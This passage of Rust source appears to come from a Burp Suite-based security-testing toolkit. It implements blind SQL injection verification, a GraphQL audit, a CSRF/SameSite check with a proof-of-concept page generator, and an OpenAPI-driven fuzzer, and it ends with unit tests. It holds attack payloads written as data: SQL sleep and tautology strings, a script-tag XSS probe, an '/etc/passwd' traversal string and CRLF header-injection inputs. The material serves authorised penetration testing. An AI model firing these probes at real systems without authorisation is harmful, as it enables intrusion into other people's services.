    let diff_score = diff_engine::calculate_similarity(
        split_http_response(&true_text).body,
        split_http_response(&false_text).body,
    );

    let sleep_payload = format!("1' AND SLEEP({sleep_sec})-- -");
    let start_sleep = std::time::Instant::now();
    let sleep_response = client
        .send_request(parameterized_request(
            &method,
            &input.url,
            &input.param_name,
            &sleep_payload,
            location,
        )?)
        .await
        .map_err(|error| format!("time-based SQLi probe failed: {error}"))?;
    require_response(sleep_response, "time-based SQLi probe failed")?;
    let sleep_latency = start_sleep.elapsed().as_millis();

    let expected_delay = (sleep_sec as u128 * 1000).saturating_sub(500);
    let is_time_sqli = sleep_latency.saturating_sub(base_latency) >= expected_delay;
    let is_bool_sqli = diff_score < 0.75;
    let (vulnerable, technique, verdict) = if is_time_sqli {
        (
            true,
            "Time-Based Blind SQLi".to_owned(),
            format!(
                "CONFIRMED TIME-BASED SQLI: sleep probe added {}ms over the {}ms baseline",
                sleep_latency.saturating_sub(base_latency),
                base_latency
            ),
        )
    } else if is_bool_sqli {
        (
            true,
            "Boolean-Based Differential SQLi".to_owned(),
            format!(
                "CONFIRMED BOOLEAN SQLI: true and false response similarity was {diff_score:.2}"
            ),
        )
    } else {
        (
            false,
            "None".to_owned(),
            "NO SQLI EVIDENCE: response similarity and added latency stayed within thresholds"
                .to_owned(),
        )
    };
    Ok(VerifySqliBlindOutput {
        url: input.url,
        boolean_diff_score: diff_score,
        base_latency_ms: base_latency,
        sleep_latency_ms: sleep_latency,
        vulnerable,
        technique,
        verdict,
    })
}

// =========================================================================
// 7. burp_audit_graphql (GraphQL Security Audit)
// =========================================================================
#[derive(Debug, Deserialize, schemars::JsonSchema)]
pub struct AuditGraphqlInput {
    pub endpoint: String,
    pub headers: Option<HashMap<String, String>>,
    pub test_batching: Option<bool>,
    pub test_introspection: Option<bool>,
    pub test_field_suggestions: Option<bool>,
}

#[derive(Debug, Serialize, schemars::JsonSchema)]
pub struct AuditGraphqlOutput {
    pub endpoint: String,
    pub introspection_enabled: bool,
    pub field_suggestions_enabled: bool,
    pub batching_supported: bool,
    pub vulnerable: bool,
    pub issues_found: Vec<String>,
}

pub async fn run_audit_graphql(
    client: &BurpClient,
    input: AuditGraphqlInput,
) -> Result<AuditGraphqlOutput, String> {
    validate_http_url(&input.endpoint, "endpoint")?;
    let base_headers = input.headers.unwrap_or_default();
    validate_headers(&base_headers)?;
    let test_introspection = input.test_introspection.unwrap_or(true);
    let test_field_suggestions = input.test_field_suggestions.unwrap_or(true);
    let test_batching = input.test_batching.unwrap_or(true);
    if !test_introspection && !test_field_suggestions && !test_batching {
        return Err("at least one GraphQL audit check must be enabled".to_owned());
    }
    let mut issues = Vec::new();

    let introspection_enabled = if test_introspection {
        let response = send_graphql_post(
            client,
            &input.endpoint,
            &base_headers,
            r#"{"query":"{__schema{types{name}}}"}"#,
            "introspection",
        )
        .await?;
        let enabled = graphql_json(&response).is_some_and(|json| graphql_has_introspection(&json));
        if enabled {
            issues.push("GraphQL introspection is enabled and exposed the schema".to_owned());
        }
        enabled
    } else {
        false
    };

    let field_suggestions_enabled = if test_field_suggestions {
        let response = send_graphql_post(
            client,
            &input.endpoint,
            &base_headers,
            r#"{"query":"{__schema_invalid_query_field}"}"#,
            "field-suggestion",
        )
        .await?;
        let enabled = graphql_json(&response).is_some_and(|json| graphql_has_suggestions(&json));
        if enabled {
            issues.push("GraphQL error responses expose field suggestions".to_owned());
        }
        enabled
    } else {
        false
    };

    let batching_supported = if test_batching {
        let response = send_graphql_post(
            client,
            &input.endpoint,
            &base_headers,
            r#"[{"query":"{__typename}"},{"query":"{__typename}"},{"query":"{__typename}"}]"#,
            "batching",
        )
        .await?;
        let supported = graphql_json(&response).is_some_and(|json| graphql_batch_supported(&json));
        if supported {
            issues.push(
                "GraphQL array batching is supported and may amplify rate-limit bypasses"
                    .to_owned(),
            );
        }
        supported
    } else {
        false
    };

    Ok(AuditGraphqlOutput {
        endpoint: input.endpoint,
        introspection_enabled,
        field_suggestions_enabled,
        batching_supported,
        vulnerable: !issues.is_empty(),
        issues_found: issues,
    })
}

async fn send_graphql_post(
    client: &BurpClient,
    endpoint: &str,
    base_headers: &HashMap<String, String>,
    body: &str,
    probe: &str,
) -> Result<String, String> {
    let mut headers = base_headers.clone();
    headers.insert("Content-Type".to_owned(), "application/json".to_owned());
    let response = client
        .send_request(SendRequestRequest {
            method: "POST".to_owned(),
            url: endpoint.to_owned(),
            body: body.as_bytes().to_vec(),
            headers: proto_headers(&headers),
        })
        .await
        .map_err(|error| format!("GraphQL {probe} probe failed: {error}"))?;
    let response = require_response(response, &format!("GraphQL {probe} probe failed"))?;
    if response.status >= 500 {
        return Err(format!(
            "GraphQL {probe} probe returned server error HTTP {}",
            response.status
        ));
    }
    Ok(String::from_utf8_lossy(&response.response).into_owned())
}

// =========================================================================
// 8. burp_verify_csrf_samesite (CSRF & SameSite Cookie PoC Generator)
// =========================================================================
#[derive(Debug, Deserialize, schemars::JsonSchema)]
pub struct VerifyCsrfInput {
    pub url: String,
    pub method: Option<String>,
    pub body: Option<String>,
    pub session_cookie_name: String,
}

#[derive(Debug, Serialize, schemars::JsonSchema)]
pub struct VerifyCsrfOutput {
    pub url: String,
    pub samesite_attribute: String,
    pub is_vulnerable: bool,
    pub poc_html: String,
    pub remediation: String,
}

pub async fn run_verify_csrf_samesite(
    client: &BurpClient,
    input: VerifyCsrfInput,
) -> Result<VerifyCsrfOutput, String> {
    validate_http_url(&input.url, "url")?;
    validate_name(&input.session_cookie_name, "session_cookie_name")?;
    let method = normalize_method(input.method, "POST")?;
    if matches!(method.as_str(), "GET" | "HEAD" | "OPTIONS" | "TRACE") {
        return Err(
            "method must be state-changing; use POST, PUT, PATCH, DELETE, or another mutating method"
                .to_owned(),
        );
    }
    let body = input.body.unwrap_or_default();
    let response = client
        .send_request(SendRequestRequest {
            method: method.clone(),
            url: input.url.clone(),
            body: body.as_bytes().to_vec(),
            headers: vec![HttpHeaderEntry {
                name: "Content-Type".to_owned(),
                value: "application/x-www-form-urlencoded".to_owned(),
            }],
        })
        .await
        .map_err(|error| format!("CSRF probe failed: {error}"))?;
    let response = require_response(response, "CSRF probe failed")?;
    let raw_response = String::from_utf8_lossy(&response.response);
    let same_site = cookie_samesite(&raw_response, &input.session_cookie_name)
        .unwrap_or_else(|| "Unknown".to_owned());
    let vulnerable = csrf_is_vulnerable(response.status, &same_site);
    let remediation = if matches!(response.status, 401 | 403) {
        "The unauthenticated cross-site-style request was denied; retain token/origin validation and verify every mutating endpoint."
    } else if same_site.eq_ignore_ascii_case("unknown") {
        "No matching Set-Cookie was observed. Inspect the active session cookie and require anti-CSRF tokens or strict Origin validation before drawing a conclusion."
    } else {
        "Enforce SameSite=Lax or SameSite=Strict where compatible and require anti-CSRF tokens or strict Origin validation for mutating requests."
    };
    Ok(VerifyCsrfOutput {
        url: input.url.clone(),
        samesite_attribute: same_site,
        is_vulnerable: vulnerable,
        poc_html: csrf_poc(&input.url, &method, &body),
        remediation: remediation.to_owned(),
    })
}

// =========================================================================
// 9. burp_api_fuzz_orchestrator (Automated API Fuzzing from Spec)
// =========================================================================
#[derive(Debug, Deserialize, schemars::JsonSchema)]
pub struct ApiFuzzOrchestratorInput {
    pub spec_content: String,
    pub target_base_url: String,
    pub auth_headers: Option<HashMap<String, String>>,
    pub fuzz_categories: Option<Vec<String>>,
}

#[derive(Debug, Serialize, schemars::JsonSchema)]
pub struct ApiFuzzAnomaly {
    pub method: String,
    pub endpoint: String,
    pub status: u32,
    pub payload_category: String,
    pub description: String,
}

#[derive(Debug, Serialize, schemars::JsonSchema)]
pub struct ApiFuzzOrchestratorOutput {
    pub total_endpoints_fuzzed: usize,
    pub total_requests_sent: usize,
    pub anomalies: Vec<ApiFuzzAnomaly>,
    pub summary: String,
}

const CANONICAL_FUZZ_CATEGORIES: [&str; 4] = ["sqli", "xss", "overflow", "traversal"];

pub fn resolve_fuzz_categories(
    requested: Option<&[String]>,
) -> Result<Vec<(&'static str, &'static str)>, String> {
    static OVERFLOW_PAYLOAD: std::sync::LazyLock<String> =
        std::sync::LazyLock::new(|| "A".repeat(1024));

    let available: [(&'static str, &'static str); 4] = [
        ("sqli", "' OR '1'='1"),
        ("xss", "<script>alert(1)</script>"),
        ("overflow", OVERFLOW_PAYLOAD.as_str()),
        ("traversal", "../../../../etc/passwd"),
    ];

    let Some(req) = requested else {
        return Ok(available.to_vec());
    };

    let mut selected = std::collections::HashSet::new();
    for cat in req {
        let cat_trimmed = cat.trim();
        if !CANONICAL_FUZZ_CATEGORIES.contains(&cat_trimmed) {
            return Err(format!(
                "Unknown fuzz category '{cat_trimmed}'. Supported categories are: {}",
                CANONICAL_FUZZ_CATEGORIES.join(", ")
            ));
        }
        selected.insert(cat_trimmed);
    }

    let mut result = Vec::new();
    for (cat, payload) in available {
        if selected.contains(cat) {
            result.push((cat, payload));
        }
    }

    Ok(result)
}

pub async fn run_api_fuzz_orchestrator(
    client: &BurpClient,
    input: ApiFuzzOrchestratorInput,
) -> Result<ApiFuzzOrchestratorOutput, String> {
    validate_http_url(&input.target_base_url, "target_base_url")?;
    let base_headers = input.auth_headers.unwrap_or_default();
    validate_headers(&base_headers)?;
    let payloads = resolve_fuzz_categories(input.fuzz_categories.as_deref())?;
    if payloads.is_empty() {
        return Err("fuzz_categories must select at least one category".to_owned());
    }
    let observations = sitegraph::ingest::openapi::observations(
        input.spec_content.as_bytes(),
        &input.target_base_url,
        100,
    )
    .map_err(|error| format!("failed to parse OpenAPI spec: {error}"))?;
    if observations.is_empty() {
        return Err("OpenAPI spec contains no supported HTTP operations".to_owned());
    }

    let mut anomalies = Vec::new();
    let mut requests_sent = 0;
    for observation in &observations {
        for (category, payload) in &payloads {
            let fuzz_url = append_query_parameter(&observation.url, "fuzz", payload)?;
            let response = client
                .send_request(SendRequestRequest {
                    method: observation.method.clone(),
                    url: fuzz_url,
                    body: Vec::new(),
                    headers: proto_headers(&base_headers),
                })
                .await
                .map_err(|error| {
                    format!(
                        "API fuzz request for {} {} ({category}) failed: {error}",
                        observation.method, observation.url
                    )
                })?;
            let response = require_response(
                response,
                &format!(
                    "API fuzz request for {} {} ({category}) failed",
                    observation.method, observation.url
                ),
            )?;
            requests_sent += 1;
            if response.status >= 500 {
                anomalies.push(ApiFuzzAnomaly {
                    method: observation.method.clone(),
                    endpoint: observation.url.clone(),
                    status: response.status,
                    payload_category: (*category).to_owned(),
                    description: format!(
                        "Server returned HTTP {} for the {category} mutation",
                        response.status
                    ),
                });
            }
        }
    }

    Ok(ApiFuzzOrchestratorOutput {
        total_endpoints_fuzzed: observations.len(),
        total_requests_sent: requests_sent,
        summary: format!(
            "Fuzzed {} endpoints with {} completed requests; found {} server-error anomalies.",
            observations.len(),
            requests_sent,
            anomalies.len()
        ),
        anomalies,
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    fn response(status: u32, raw: &str) -> SendRequestResponse {
        SendRequestResponse {
            request: Vec::new(),
            response: raw.as_bytes().to_vec(),
            status,
            has_response: true,
        }
    }

    #[test]
    fn idor_pattern_on_denied_response_is_not_confirmation() {
        let baseline = response(200, "HTTP/1.1 200 OK\r\n\r\nsecret resource");
        let denied = response(
            403,
            "HTTP/1.1 403 Forbidden\r\n\r\nsecret marker in error message",
        );
        let (vulnerable, pattern_matched, verdict) =
            classify_idor(&baseline, &denied, Some("secret"), 0.95);
        assert!(!vulnerable);
        assert!(!pattern_matched);
        assert!(verdict.starts_with("PROTECTED"));
    }

    #[test]
    fn idor_requires_successful_baseline_and_candidate() {
        let baseline = response(500, "HTTP/1.1 500 Error\r\n\r\nsame");
        let candidate = response(200, "HTTP/1.1 200 OK\r\n\r\nsame");
        assert!(!classify_idor(&baseline, &candidate, None, 1.0).0);
    }

    #[test]
    fn cors_parser_ignores_header_like_response_body_text() {
        let raw = "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nAccess-Control-Allow-Origin: https://evil.example\r\nAccess-Control-Allow-Credentials: true";
        assert_eq!((None, None), cors_headers(raw));
    }

    #[test]
    fn cors_parser_matches_case_insensitive_names_and_preserves_values() {
        let raw = "HTTP/1.1 200 OK\r\naCcEsS-CoNtRoL-aLlOw-OrIgIn: https://Case.Example\r\nACCESS-CONTROL-ALLOW-CREDENTIALS: TRUE\r\n\r\nbody";
        assert_eq!(
            (
                Some("https://Case.Example".to_owned()),
                Some("TRUE".to_owned())
            ),
            cors_headers(raw)
        );
    }

    #[test]
    fn ssrf_correlation_excludes_ambient_historical_interactions() {
        let payloads = HashSet::from(["current.oast.test"]);
        assert_eq!(
            1,
            correlated_interaction_count(
                &payloads,
                ["old.oast.test", "current.oast.test", "unrelated.oast.test"]
            )
        );
    }

    #[test]
    fn query_parameter_append_preserves_existing_query_and_fragment() {
        let output = append_query_parameter(
            "https://example.test/path?existing=1#section",
            "next",
            "a b&c",
        )
        .unwrap();
        let parsed = Url::parse(&output).unwrap();
        assert_eq!(Some("section"), parsed.fragment());
        assert_eq!(
            vec![
                ("existing".to_owned(), "1".to_owned()),
                ("next".to_owned(), "a b&c".to_owned())
            ],
            parsed
                .query_pairs()
                .map(|(name, value)| (name.into_owned(), value.into_owned()))
                .collect::<Vec<_>>()
        );
    }

    #[test]
    fn body_parameter_mode_encodes_form_data_and_schema_is_typed() {
        let request = parameterized_request(
            "POST",
            "https://example.test/search",
            "id",
            "1' AND 1=2",
            ParameterLocation::Body,
        )
        .unwrap();
        assert_eq!("https://example.test/search", request.url);
        assert_eq!(b"id=1%27+AND+1%3D2", request.body.as_slice());
        assert_eq!(
            "application/x-www-form-urlencoded",
            request.headers[0].value
        );

        let schema = serde_json::to_value(schemars::schema_for!(VerifySqliBlindInput)).unwrap();
        let serialized = schema.to_string();
        assert!(serialized.contains("query"));
        assert!(serialized.contains("body"));
    }

    #[test]
    fn graphql_evidence_requires_structural_json_shapes() {
        let misleading = serde_json::json!({"message": "__schema types Did you mean __typename"});
        assert!(!graphql_has_introspection(&misleading));
        assert!(!graphql_has_suggestions(&misleading));
        assert!(!graphql_batch_supported(&misleading));

        assert!(graphql_has_introspection(
            &serde_json::json!({"data": {"__schema": {"types": []}}})
        ));
        assert!(graphql_has_suggestions(
            &serde_json::json!({"errors": [{"message": "Did you mean 'user'?"}]})
        ));
        assert!(graphql_batch_supported(&serde_json::json!([
            {"data": {"__typename": "Query"}},
            {"data": {"__typename": "Query"}},
            {"data": {"__typename": "Query"}}
        ])));
    }

    #[test]
    fn csrf_cookie_parser_targets_named_cookie_and_requires_success() {
        let raw = "HTTP/1.1 200 OK\r\nSet-Cookie: other=x; SameSite=Strict\r\nset-cookie: SESSION=abc; Path=/; samesite=None; Secure\r\n\r\n{}";
        assert_eq!(Some("None".to_owned()), cookie_samesite(raw, "session"));
        assert!(csrf_is_vulnerable(200, "None"));
        assert!(!csrf_is_vulnerable(403, "None"));
        assert!(!csrf_is_vulnerable(200, "Strict"));
        assert!(!csrf_is_vulnerable(200, "Unknown"));
    }

    #[test]
    fn csrf_poc_escapes_every_attribute_context() {
        let poc = csrf_poc(
            "https://example.test/?x=\" onmouseover=\"alert(1)",
            "POST",
            "\"/><script>alert(1)</script>",
        );
        assert!(!poc.contains("onmouseover=\"alert(1)"));
        assert!(!poc.contains("\"/><script>"));
        assert!(poc.contains("&quot;"));
    }

    #[test]
    fn workflow_validation_rejects_injection_shaped_inputs() {
        assert!(validate_http_url("file:///tmp/test", "url").is_err());
        assert!(normalize_method(Some("GET\r\nInjected: x".to_owned()), "GET").is_err());
        assert!(
            validate_headers(&HashMap::from([(
                "X-Test".to_owned(),
                "ok\r\nInjected: yes".to_owned()
            )]))
            .is_err()
        );
    }

    #[test]
    fn resolve_fuzz_categories_defaults_filtering_and_errors() {
        let defaults = resolve_fuzz_categories(None).unwrap();
        assert_eq!(
            vec!["sqli", "xss", "overflow", "traversal"],
            defaults.iter().map(|(name, _)| *name).collect::<Vec<_>>()
        );

        let requested = vec!["traversal".to_owned(), "sqli".to_owned(), "sqli".to_owned()];
        assert_eq!(
            vec!["sqli", "traversal"],
            resolve_fuzz_categories(Some(&requested))
                .unwrap()
                .iter()
                .map(|(name, _)| *name)
                .collect::<Vec<_>>()
        );

        let unknown = vec!["unknown".to_owned()];
        assert!(resolve_fuzz_categories(Some(&unknown)).is_err());
        let empty = Vec::<String>::new();
        assert!(resolve_fuzz_categories(Some(&empty)).unwrap().is_empty());
    }
}
